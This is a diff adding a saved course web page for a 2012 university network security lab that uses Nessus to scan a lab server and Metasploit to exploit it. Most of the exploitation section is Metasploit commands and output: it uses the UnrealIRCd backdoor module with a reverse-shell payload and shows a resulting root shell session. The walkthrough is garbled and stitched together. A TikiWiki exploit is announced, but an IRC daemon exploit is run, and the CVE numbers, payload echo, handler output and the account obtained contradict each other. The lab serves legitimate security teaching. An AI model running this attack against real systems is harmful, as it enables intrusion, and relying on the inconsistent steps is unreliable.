@@ -1,0 +1,304 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<!-- saved from url=(0050)http://netsec.cs.northwestern.edu/readings/nessus/ -->
+<html><script id="tinyhippos-injected">if (window.top.require) { window.top.require("ripple/bootstrap").inject(window, document); }</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Network Penetration and Security — EECS 354 </title>
+    
+    <link href="./Network Penetration and Security — EECS 354_files/global.css" rel="stylesheet" type="text/css">
+    
+<link href="./Network Penetration and Security — EECS 354_files/wiki.css" rel="stylesheet" type="text/css">
+
+<style type="text/css"></style></head>
+<body><div id="StayFocusd-infobar" style="display: none; top: 3700px;"><img src="chrome-extension://laankejkbhbdhmipfmgcngdelahlfoji/img/eye_19x19_red.png"><span id="StayFocusd-infobar-msg"></span><span id="StayFocusd-infobar-links"><a href="http://netsec.cs.northwestern.edu/readings/nessus/#" id="StayFocusd-infobar-never-show">hide forever</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="http://netsec.cs.northwestern.edu/readings/nessus/#" id="StayFocusd-infobar-hide">hide once</a></span></div>
+
+  <div id="header">
+    <h1>Network Penetration and Security</h1>
+    <h2>Northwestern EECS, Fall Quarter 2012</h2>
+  </div>
+  <ul id="navigation">
+    
+    <li><a href="http://netsec.cs.northwestern.edu/">Home</a></li>
+    <li><a href="http://netsec.cs.northwestern.edu/schedule/">Schedule</a></li>
+    <li><a href="http://netsec.cs.northwestern.edu/readings/">Readings</a></li>
+    <li><a href="http://netsec.cs.northwestern.edu/projects/">Projects</a></li>
+
+    
+    
+    <li class="right"><a href="http://netsec.cs.northwestern.edu/login/">Login</a></li>
+    
+    <li class="right"><a href="http://groups.google.com/group/nuctf">Newsgroup</a></li>
+  </ul>
+  
+  <div id="content">
+    
+  <h1>﻿Nessus</h1>
+
+<h2>Introduction</h2>
+<p>Nessus is a vulnerability scanning tool. It can be used to detect thousands of well-known potential vulnerabilities on a remote host. Nessus is commonly used by network administrators who want to keep their domains secured against these common vulnerabilities that malicious hackers and viruses often look to exploit.
+</p>
+<p>Similarly to nmap, Nessus performs a port scan on the target machine. However, whereas nmap only tells you what's listening, Nessus can tell you what's vulnerable. One way it can accomplish this is by performing various checks to determine which services are running on the remote host (e.g., Apache), what their version numbers are (e.g., 2.2.2), and then checking against a database of known vulnerabilities that are present in those versions of the services (e.g., mod_rewrite off-by-one error, <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3747">CVE-2006-3747</a>).
+</p>
+<p>However, the rules used to detect vulnerabilities are highly flexible. These rules are contained within Nessus plugins, which are written in a language called NASL (Nessus Attack Scripting Language). Typically, each vulnerability that Nessus is capable of detecting is expressed as a plugin. Currently, there are about forty thousand plugins that are shipped with Nessus, and dozens more are added every week as new vulnerabilities are discovered.
+</p>
+<p>In general, Nessus does not actually perform any exploits - it only detects vulnerabilities. Neither does Nessus prevent attacks or make any attempts to correct the vulnerabilities - it is still up to the network administrator to patch these vulnerabilities based on the guidance that Nessus provides.
+</p>
+<p>Nessus can be used in conjunction with Metasploit, which is what we will be doing in this lab. We will first scan a machine to discover its vulnerabilities, and then use Metasploit to attempt to exploit these vulnerabilities. The machine that we will be scanning is at <a href="http://netsec-2.cs.northwestern.edu/">http://netsec-2.cs.northwestern.edu</a>. We will assume that our objective is to obtain a shell on this server. 
+</p>
+<p>On UNIX, Nessus operates according to a client-server architecture.  The Nessus client connects to the server, provides it with information, and the server actually runs the scan.
+</p>
+
+<h2>Scan Preparation</h2>
+<p>Nessus begins by running a port-scan (using nmap) on the target host to determine which ports are open.  Once open ports are identified, Nessus runs a set of exploits on the open ports.  Nessus assumes standard processes run on standard ports (i.e. http on port 80). The last step it performs is checking for and reporting vulnerabilities.
+</p>
+<p>The Nessus server is installed on <code>netsec</code>. The client is a Flash application that you can access via the browser. To use the client, connect to <a href="https://netsec.cs.northwestern.edu:8834/">https://netsec.cs.northwestern.edu:8834</a>. You may need to confirm a security exception since Nessus uses a self-signed certificate. After you confirm the security exception, you will be presented with a login screen: 
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/login.png" alt="Login">
+</p>
+<p><b>Log in using your netsec username. The password is located in file "nessus_passwd" at your home directory.</b>
+</p>
+<p>In order to perform a scan, you need to have a scan policy. In Nessus, a "policy" refers to a set of options relevant to performing vulnerability scans, including but not limited to types of port scanners used, timeouts, various plugin options, reporting options, and credentials for SMB shares or databases on the hosts being scanned.
+</p>
+<p>You will not need to create a scan policy for this lab as we have already performed a scan and prepared a report for you to browse; however, it is still important that you understand what the various options are, so follow along with the instructions in this section carefully. The scan policy dictates which vulnerabilities Nessus is able to detect, and it is easy to miss high severity vulnerabilities if you do not configure the scan policy correctly.
+</p>
+<p>In order to create a new policy, click the "Policies" tab at the top of the interface and then click the Add button near the top right: 
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/policies.png" alt="Policies">
+</p>
+<p>You will be taken to an interface for editing policy options. It defaults to the General tab, where you can set options such as the port range, type of port scanner (TCP, UDP, SYN, etc), among other fundamental options.
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/addpolicy.png" alt="Add Policy">
+</p>
+<p>Notice the tabs along the left hand side: General, Credentials, Plugins, and Preferences. Also, pay attention to the drop down menu that appears near the top of the page when you click on Credentials or Preferences. The range of options is very extensive (if not overwhelming), and you are encouraged to dig around the menus to get a feel for how finely tuned a specific scan can be.
+</p>
+<p>Two basic options that are worth highlighting is the Port Scan Range which limits which ports you target. This can save large amounts of time if you know which particular services you are looking for vulnerabilities in. If you set this option, it will apply to both TCP and UDP scans. The other is the "Safe Checks" option, which is ticked by default. This ensures that Nessus will not attempt any tests that are detrimental to the scanned machine -- something you certainly want to leave checked when scanning a live production server, for example.
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/port_scan_range.png" alt="Port Scan Range">
+</p>
+<p>In order to detect the relevant vulnerabilities for this lab, you would need to select the following options on the "Preferences" page:
+</p>
+<ul>
+ <li>
+     Under "Global variable settings", select "Enable CGI scanning" as well as "Thorough tests".
+ </li>
+
+ <li>
+     Under "Web Application Tests Settings", check all of the checkboxes.
+ </li>
+</ul>
+<p>Elsewhere, the default settings will suffice for this lab. If you are unsure about any of the settings on the General page, mouse over the name of the option and a tooltip will appear for most items.
+</p>
+<p>There is a wide variety of other options available when creating a scan policy. A lot of options deal with credentials that you can supply to Nessus in order to get more complete and accurate scan results. This is useful, for example, when you want to scan for potential vulnerabilities on a system that an authenticated user can exploit. If you want to get a better understanding of what Nessus is capable of, we encourage you to read through the <a href="http://static.tenable.com/documentation/nessus_4.2_user_guide.pdf">Nessus User Guide</a>.
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/tooltip.png" alt="Tooltip">
+</p>
+
+<h2>Running the Scan</h2>
+<p>You will not need to actually run the scan for this lab. Running the scan takes a while and generates a large amount of network traffic, so we have prepared a finished scan report that you can browse. However, if you would like to perform a scan on your own, you will find that it's pretty straightforward. To run a scan, click on the "Scans" tab at the top and then click on Add. Give this scan a name, select the scan policy that you configured earlier, and enter the address of the remote machine that you would like to scan.
+</p>
+<p>Clicking on Submit starts the scan immediately. Once the scan is launched, the scan list shows all the scans which are currently running. After selecting a scan, you can either pause, resume, or completely stop a scan. When a scan is complete, it is removed from scans list and available for review on the "Reports" tab. 
+</p>
+
+<h2>Interpreting the Scan Results</h2>
+<p>To access the report that we have prepared for you, download it from <a href="http://labfs.eecs.northwestern.edu/~zrs881/netsec/nessus/netsec-lab-nessus-report.nessus">here</a> and save it locally on your machine. Then, in Nessus, go to the "Reports" tab, click on "Upload", and choose the file that you just saved.
+</p>
+<p><font color="red">Note, the report we provided and you scaned may be different from the screenshot above. But the tikiwiki vulnerability is definitely exploitable. You are expected to repeat the exploit and show staff the shell obtained as class exercise.</font>
+</p>
+<p>On the "Reports" tab, you should see a list of all the scans that are running or have completed. To view the results, select a report (use the "netsec-2" report for this lab) and click on "Browse". Spend some time browsing through the report to see what sort of information Nessus was able to determine.
+</p>
+<p>Now that we have identified some potential vulnerabilities on the machine, let's see if we can proceed to exploit them. With over a dozen "high" and "medium" severity results to choose from, how shall we go about this?
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/scan_results_toplevel.png" alt="Scan Results">
+</p>
+<p>First, it is worth noting that not all of these results are particularly useful to us, regardless of severity, depending on what our objective is. For example, let's take a look at the result for UDP port 53. Nessus reports that it discovered a "Multiple Vendor DNS Query ID Field Prediction Cache Poisoning" vulnerability on the machine, which is high severity:
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/dns_cache_poisoning.png" alt="DNS Cache Poisoning Vulnerability">
+</p>
+<p>There is a good reason why DNS cache poisoning is a high severity issue - as the description says, it could allow an attacker to redirect the users of a website to any location of the attacker's choosing. However, as our objective for this lab is to simply obtain a remote shell on the server, this vulnerability is entirely useless to us.
+</p>
+<p>On the other hand, let's take a look at the results for TCP port 80:
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/port80.png" alt="TCP port 80">
+</p>
+<p>If you specified in your Scan Policy to perform web application tests, as well as to perform thorough tests under "global variable settings", Nessus should be able to detect that the server is running TikiWiki, a popular PHP-based content management system. If you view the result for "TikiWiki Detection", you will find that this service is available at the URL netsec-2.cs.northwestern.edu/tikiwiki.
+</p>
+<p>Again, note the advantage of Nessus over a simple port scanner like nmap: whereas a port scanner could only tell you that TCP port 80 was open, Nessus runs a battery of tests to determine what software packages are running on the server, and in many cases, even their version numbers and configuration options.
+</p>
+<p>Of particular interest to us is the high severity result that may potentially allow us to execute code on the server: 
+   <code>TikiWiki tiki-graph_formula.php f Parameter Arbitrary Command Execution</code>
+</p>
+<p><img src="./Network Penetration and Security — EECS 354_files/tikiwiki_graph.png" alt="Vulnerable service that may allow arbitrary command execution">
+</p>
+<p>This looks promising. Let's try to exploit this vulnerability in Metasploit.
+</p>
+
+<h2>Performing the Exploit</h2>
+<p>To begin, note the CVE number in the Nessus scan result: CVE-2007-5423. CVE (Common Vulnerabilities and Exposures) is a large database of publicly-known security vulnerabilities, each uniquely distinguished by a "CVE Identifier" such as CVE-2007-5423. There are varying amounts of information that could be obtained about each vulnerability if you search for it on the CVE website. As it happens, the CVE entry for the vulnerability that we found does not provide any additional information beyond what Nessus had told us; however, knowing this number will nevertheless prove helpful momentarily.
+</p>
+<p>Next, connect to Metasploit using <code>msfconsole4</code>. Do not use <code>msfconsole</code> because that is not a Run a search for the CVE number:
+</p>
+<pre><code>msf &gt; search CVE:2010-2705
+[*] Searching loaded modules for pattern 'CVE:2010-2705'...
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date          Rank       Description
+   ----                                        ---------------          ----       -----------
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12 00:00:00 UTC  excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
+</code></pre><p>You could alternatively search for "ircd". In this case, it still returns the same exploit, but sometimes there may be more exploits for a given program than the one found by nessus. However, there is no guarantee that all of them would work with the particular version of Tikiwiki that is running on the server. If you also consider the various configuration settings that may be present or absent that are required for these exploits to work, it becomes clear why it is better in most cases to search for the specific CVE number that Nessus reported instead of just the name of the service.
+</p>
+<p>You can use the info command to obtain some more information about the exploit:
+</p>
+<pre><code>msf &gt;  info exploit/unix/irc/unreal_ircd_32
+
+       Name: UnrealIRCD 3.2.8.1 Backdoor Command Execution
+     Module: exploit/unix/irc/unreal_ircd_3281_backdoor
+    Version: 15347
+   Platform: Unix
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+
+Provided by:
+  hdm <hdm@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic Target
+
+Basic options:
+  Name   Current Setting  Required  Description
+  ----   ---------------  --------  -----------
+  RHOST                   yes       The target address
+  RPORT  6667             yes       The target port
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a malicious backdoor that was added to the
+  Unreal IRCD 3.2.8.1 download archive. This backdoor was present in
+  the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th
+  2010.
+
+References:
+  http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-2075
+  http://www.osvdb.org/65445
+  http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
+</code></pre><p>Let's attempt this exploit on <code>netsec-2</code>. Start by telling Metasploit to use this exploit:
+</p>
+<p><code>msf &gt; use exploit/unix/irc/unreal_ircd_32</code>
+</p>
+
+</code></pre><p>Let's see what payloads are available with this exploit:
+</p>
+<pre><code>msf exploit(unreal_ircd_3281_backdoor) &gt; show payloads
+
+
+Compatible Payloads
+===================
+
+   Name                     Disclosure Date  Rank    Description
+   ----                     ---------------  ----    -----------
+   cmd/unix/bind_perl                        normal  Unix Command Shell, Bind TCP (via perl)
+   cmd/unix/bind_perl_ipv6                   normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                        normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                   normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                          normal  Unix Command, Generic command execution
+   cmd/unix/reverse                          normal  Unix Command Shell, Double reverse TCP (telnet)
+   cmd/unix/reverse_perl                     normal  Unix Command Shell, Reverse TCP (via perl)
+   cmd/unix/reverse_ruby                     normal  Unix Command Shell, Reverse TCP (via Ruby)
+</code></pre><p>There are a number of ways we could obtain a shell. For simplicity, let's pick <code>cmd/unix/reverse</code>
+<pre><code>msf exploit(unreal_ircd_3281_backdoor) &gt; set PAYLOAD cmd/unix/reverse
+payload =&gt; php/bind_php
+</pre></code>
+
+</p>
+<p> Now, what other options are there? To see what else is required for this exploit, use the command <code>show options</code>:
+</p>
+<pre><code>msf &gt; show options
+
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                        yes       The target address
+   RPORT  6667             yes       The target port
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                        yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+</code></pre><p>We see that we need to set <code>RHOST</code>, <code>LHOST</code>  and <code>LPORT</code>. We can leave <code>RPORT</code> at its current setting of 6667. The LHOST and LPORT are required since this is a backdoor exploit and the reverse shell needs to know where to connect to.
+</p>
+<pre><code>msf exploit(unreal_ircd_3281_backdoor)&gt; set RHOST netsec-2.cs.northwestern.edu
+RHOST =&gt; netsec-2.cs.northwestern.edu</pre></code>
+Now, use ifconfig to get your ipaddress and set it as LHOST. Remember to change LPORT so that you aren't using the same ports as other students on the netsec machines. Now, we are ready to exploit
+</p>
+
+<pre><code>
+msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
+[*] Attempting to obtain database credentials...
+[*] Started bind handler
+[*] Command shell session 2 opened (165.124.137.187:42519 -&gt; netsec-2.cs.northwestern.edu:4444) at 2010-11-10 02:46:53 -0600
+
+[*] Started reverse handler on 192.168.91.1:4444
+[*] Connected to netsec-2.cs.northwestern.edu:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] Sending backdoor command...
+[*] Command shell session 2 opened (192.168.91.1:4444 -> 192.168.91.1:57361) at 2012-12-03 20:21:05 -0600
+
+whoamii
+whoami
+root
+ls
+Donation
+LICENSE
+aliases
+badwords.channel.conf
+badwords.message.conf
+badwords.quit.conf
+curl-ca-bundle.crt
+dccallow.conf
+doc
+help.conf
+ircd.log
+ircd.pid
+ircd.tune
+modules
+networks
+spamfilter.conf
+tmp
+unreal
+unrealircd.conf
+exit
+</code></pre>
+<h2>Class Exercise</h2>
+<p>Browse through the Nessus scan results and see if you can find another way to obtain a shell on the <code>netsec-2</code> server. Remember, not all of the vulnerabilities are useful for obtaining a shell, so you will need to read carefully through the results to find what each vulnerability can actually give you.
+</p>
+
+<h2>Optional Exercises</h2>
+<p><strong>Meterpreter Shell:</strong> Many exploits have the Meterpreter shell available as one of the options for the payload. Meterpreter is a fairly sophisticated post-exploitation framework that facilitates many tasks that are performed after successfully exploiting a remote host, including interacting with processes, uploading files, and interacting with the file system and the network. Meterpreter also has other important advantages for an attacker, including stealth (unlike a regular shell, Meterpreter does not spawn a new process; it also has the capability to encrypt its communication), extensibility, and familiarity (Meterpreter supports the same command set regardless of the operating system on the target machine). As an exercise, try switching the payload to a Meterpreter shell and play around with it. Use the <code>help</code> command to see which commands are available. For a more detailed overview of Meterpreter and its capabilities, take a look at the <a href="http://www.nologin.org/Downloads/Papers/meterpreter.pdf">white paper PDF</a>.
+</p>
+<p><strong>Privilege Escalation:</strong> Generally, when you obtain a remote shell on a server, you will be logged in with an unprivileged account. For example, as you saw in this lab, performing the exploit got you a shell as the <code>www-data</code> user (you can find this out by running the command <code>whoami</code>). You will find there isn't much you can do with this account (try deleting or modifying <code>/var/www/index.html</code>, for example). Try researching privilege escalation exploits and see if you can get a root shell. Note: This is not meant to be an easy exercise.
+</p>
+
+  </div>
+
+
+
+</body></html>
